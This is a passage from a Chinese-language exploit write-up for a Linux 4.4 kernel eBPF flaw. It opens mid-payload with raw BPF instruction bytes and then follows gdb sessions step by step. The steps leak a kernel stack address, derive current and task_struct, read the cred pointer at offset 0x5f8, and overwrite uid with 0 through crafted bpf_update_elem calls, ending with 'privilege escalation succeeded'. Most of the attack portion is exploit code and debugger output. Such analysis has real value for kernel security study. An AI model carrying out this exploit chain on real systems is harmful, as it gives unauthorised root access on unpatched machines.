    "\x7b\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),
    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
判断r6是否为0，为0说明是取栈地址的指令，这时会往下跳3条指令，继续执行第7条指令，将r10的内容写入r2，由于在执行第30条指令时r0指向map中的第二个元素，所以这时r2也指向这个元素，然后用户层通过get_value(2)取到了内核栈的地址，我们通过给BPF_STX_MEM(BPF_DW,
BPF_REG_2, BPF_REG_10, 0)下断点，可以看到过程如下：
    (gdb) x/20i 0xffffffff8117788b
       0xffffffff8117788b :    movzx  eax,BYTE PTR [rbx+0x1]
       0xffffffff8117788f :    movsx  rdx,WORD PTR [rbx+0x2]
       0xffffffff81177894 :    add    rbx,0x8
       0xffffffff81177898 :    mov    rcx,rax
       0xffffffff8117789b :    shr    al,0x4
       0xffffffff8117789e :    and    ecx,0xf
       0xffffffff811778a1 :    and    eax,0xf
       0xffffffff811778a4 :    mov    rcx,QWORD PTR [rbp+rcx*8-0x270]
       0xffffffff811778ac :    mov    rax,QWORD PTR [rbp+rax*8-0x270]
       0xffffffff811778b4 :    mov    QWORD PTR [rcx+rdx*1],rax
    => 0xffffffff811778b8 :    jmp    0xffffffff81176ae0 
       0xffffffff811778bd :    movzx  eax,BYTE PTR [rbx+0x1]
       0xffffffff811778c1 :    movsx  rdx,WORD PTR [rbx+0x2]
       0xffffffff811778c6 :    add    rbx,0x8
       0xffffffff811778ca :    movsxd rcx,DWORD PTR [rbx-0x4]
       0xffffffff811778ce :    and    eax,0xf
       0xffffffff811778d1 :    mov    rax,QWORD PTR [rbp+rax*8-0x270]
       0xffffffff811778d9 :    mov    QWORD PTR [rax+rdx*1],rcx
       0xffffffff811778dd :    jmp    0xffffffff81176ae0 
       0xffffffff811778e2 :    lfence 
     (gdb) i r $rax
    rax            0xffff8800758c3c88   -131939423208312
    (gdb)
其中rax的值0xffff8800758c3c88即为泄露的内核栈地址（其实应该称为帧指针更准确）。
然后通过经典的addr & ~(0x4000 -1)获取到current结构体的起始地址0xffff8800758c0000，然后构造读数据的map指令去读current中偏移为0的指针值（即为指向task_struct的指针）：
    bpf_update_elem(0, 0); 
    bpf_update_elem(1, 0xffff8800758c0000); 
    bpf_update_elem(2, 0);
其中addr为当前线程current的值0xffff8800758c0000，这样可以得到task_struct的地址，
过程如下：
    (gdb) x/10i $rip-20
       0xffffffff811778a4 :    mov    rcx,QWORD PTR [rbp+rcx*8-0x270]
       0xffffffff811778ac :    mov    rax,QWORD PTR [rbp+rax*8-0x270]
       0xffffffff811778b4 :    mov    QWORD PTR [rcx+rdx*1],rax
    => 0xffffffff811778b8 :    jmp    0xffffffff81176ae0 
       0xffffffff811778bd :    movzx  eax,BYTE PTR [rbx+0x1]
       0xffffffff811778c1 :    movsx  rdx,WORD PTR [rbx+0x2]
       0xffffffff811778c6 :    add    rbx,0x8
       0xffffffff811778ca :    movsxd rcx,DWORD PTR [rbx-0x4]
       0xffffffff811778ce :    and    eax,0xf
       0xffffffff811778d1 :    mov    rax,QWORD PTR [rbp+rax*8-0x270]
    (gdb) i r $rax
    rax            0xffff880074343c00   -131939445752832
    (gdb) x/10x 0xffff8800758c0000
    0xffff8800758c0000: 0x74343c00  0xffff8800  0x00000008  0x00000000
    0xffff8800758c0010: 0x00000001  0x00000000  0xfffff000  0x00007fff
    0xffff8800758c0020: 0x00000000  0x00000000
(gdb)其中rax的值即为指向task_struct的指针，可以看到和current结构体的第一个成员的值是一致的，都是`0xffff880074343c00`。
得到task_struct地址之后，加上cred的偏移CRED_OFFSET=0x5f8（由于内核版本不通或者内核的编译选项不同，都可能导致cred在task_struct中的偏移不同），组装读取指令取读取指向cred结构体的指针地址，
    bpf_update_elem(0, 2); 
    bpf_update_elem(1, 0xffff880074343c00+0x5f8); 
    bpf_update_elem(2, 0);
过程如下：
    (gdb) x/10i $rip
    => 0xffffffff811778b8 :    jmp    0xffffffff81176ae0 
       0xffffffff811778bd :    movzx  eax,BYTE PTR [rbx+0x1]
       0xffffffff811778c1 :    movsx  rdx,WORD PTR [rbx+0x2]
       0xffffffff811778c6 :    add    rbx,0x8
       0xffffffff811778ca :    movsxd rcx,DWORD PTR [rbx-0x4]
       0xffffffff811778ce :    and    eax,0xf
       0xffffffff811778d1 :    mov    rax,QWORD PTR [rbp+rax*8-0x270]
       0xffffffff811778d9 :    mov    QWORD PTR [rax+rdx*1],rcx
       0xffffffff811778dd :    jmp    0xffffffff81176ae0 
       0xffffffff811778e2 :    lfence 
    (gdb) i r $rax
    rax            0xffff880074cb5e00   -131939435848192
    (gdb) p (struct task_struct *)0xffff880074343c00
    $15 = (struct task_struct *) 0xffff880074343c00
    (gdb) p ((struct task_struct *)0xffff880074343c00)->cred
    $16 = (const struct cred *) 0xffff880074cb5e00
    (gdb) p &((struct task_struct *)0xffff880074343c00)->cred
    $17 = (const struct cred **) 0xffff8800743441f8
    (gdb) x/10x 0xffff880074343c00+0x5f8
    0xffff8800743441f8: 0x74cb5e00  0xffff8800  0x00707865  0x65742d00
    0xffff880074344208: 0x6e696d72  0x002d6c61  0x00000000  0x00000000
    0xffff880074344218: 0x00000000  0x00000000
    (gdb)
上图中rax的值0xffff880074cb5e00即为从task_struct中读取到的指向cred的指针。
cred的地址得到了，再加上uid在cred中的偏移（固定为4）便得到了uid的地址0xffff880074cb5e04，然后构造写数据的map指令：
    bpf_update_elem(0, 2); 
    bpf_update_elem(1, 0xffff880074cb5e04); 
    bpf_update_elem(2, 0);
过程如下（由于第一次运行exp的时候，这里没断下来，所以下面的过程是第二次运行的过程，中间一些结构体的地址发生了稍微的变化）：
    (gdb) p ((struct task_struct*)0xffff880079afe900)->cred->uid
    $38 = {val = 1000} //`此时uid还是1000`
    (gdb) ni
    0xffffffff811778ac  856     LDST(DW, u64)
    (gdb) p ((struct task_struct*)0xffff880079afe900)->cred->uid
    $39 = {val = 1000}
    (gdb) ni
    0xffffffff811778b4  856     LDST(DW, u64)
    (gdb) p ((struct task_struct*)0xffff880079afe900)->cred->uid
    $40 = {val = 1000}
    (gdb) ni
    Thread 1 hit Breakpoint 13, 0xffffffff811778b8 in __bpf_prog_run (ctx=0xffff8800746c9d80, 
        insn=0xffffc900005b5168) at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/core.c:856
    856     LDST(DW, u64)
    (gdb) p ((struct task_struct*)0xffff880079afe900)->cred->uid
    $41 = {val = 0} `//此时uid已经变为0`
    (gdb) x/10i $rip-12
       0xffffffff811778ac :    mov    rax,QWORD PTR [rbp+rax*8-0x270]
       0xffffffff811778b4 :    mov    QWORD PTR [rcx+rdx*1],rax `//就是这里改变了uid的值`
    => 0xffffffff811778b8 :    jmp    0xffffffff81176ae0 
       0xffffffff811778bd :    movzx  eax,BYTE PTR [rbx+0x1]
       0xffffffff811778c1 :    movsx  rdx,WORD PTR [rbx+0x2]
       0xffffffff811778c6 :    add    rbx,0x8
       0xffffffff811778ca :    movsxd rcx,DWORD PTR [rbx-0x4]
       0xffffffff811778ce :    and    eax,0xf
       0xffffffff811778d1 :    mov    rax,QWORD PTR [rbp+rax*8-0x270]
       0xffffffff811778d9 :    mov    QWORD PTR [rax+rdx*1],rcx
    (gdb) x/1l ($rcx+$rdx*1)  `//$rcx+$rdx*1的值0xffff880075b7ca84即为uid的地址`
    0xffff880075b7ca84: Undefined output format "l".
    (gdb) p &((struct task_struct*)0xffff880079afe900)->cred->uid
    $43 = (kuid_t *) 0xffff880075b7ca84
    (gdb) i r $rax  `//此时rax为我们需要些到uid地址的值0`
    rax            0x0  0
    (gdb)
提权成功：
到此整个漏洞利用完成，后面的部分写的有点仓促了，如果有错误的地方，还请各位朋友不吝赐教。